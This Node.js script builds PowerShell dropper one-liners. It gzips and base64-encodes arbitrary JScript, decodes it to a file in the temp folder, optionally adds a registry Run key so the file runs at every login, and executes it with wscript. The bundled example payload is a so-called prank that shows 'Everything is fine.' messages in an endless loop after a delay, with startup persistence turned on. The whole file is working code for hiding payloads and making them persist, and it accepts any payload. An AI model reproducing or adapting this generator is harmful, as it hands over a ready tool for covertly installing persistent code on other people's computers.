const zlib = require("zlib");
const { Buffer } = require("buffer");


function generatePowerShellOneLiner(jsCode, options = {}) {
    const delay = options.delay || 0;
    const addToStartup = options.addToStartup || false;

    const delayCode = delay > 0 ? `WScript.Sleep(${delay});\n` : "";
    const fullJs = delayCode + jsCode;

    const gzipped = zlib.gzipSync(fullJs);
    const base64 = gzipped.toString("base64");

    const baseScript = `$z='${base64}';$d=[IO.MemoryStream][Convert]::FromBase64String($z);$g=New-Object IO.Compression.GzipStream($d,[IO.Compression.CompressionMode]::Decompress);$s=New-Object IO.StreamReader($g);$j=$s.ReadToEnd();$f="$env:TEMP\\prank.js";sc $f $j;`;

    const regPersistence = addToStartup
        ? `New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "prank" -Value "wscript.exe //nologo $f";`
        : "";

    const executeScript = `wscript //nologo $f`;

    return `${baseScript}${regPersistence}${executeScript}`;
}

const snippetWithComments = `
// Infinite messages prank - displays an infinite loop of messages
while (true) {
    WScript.Echo("Everything is fine.");
}
`;
console.log(
    generatePowerShellOneLiner(snippetWithComments, {
        delay: 5000,
        addToStartup: true,
    })
);
